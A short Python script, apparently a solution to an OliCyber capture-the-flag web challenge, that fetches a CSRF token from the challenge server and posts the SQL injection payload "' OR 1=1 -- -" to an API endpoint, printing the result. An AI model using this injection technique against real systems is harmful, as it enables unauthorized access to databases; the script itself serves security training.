import requests

url = 'http://web-17.challs.olicyber.it'
query = "' OR 1=1 -- -"
sess = requests.Session()
csrf = sess.get(url + '/api/get_token')
headers = {
        'X-CSRFToken' : csrf.json()['token']
    }
data = {
        'query' : query
    }
resp = sess.post(url + '/api/logic', json=data, headers=headers)
resp = resp.json()
print(resp['result'])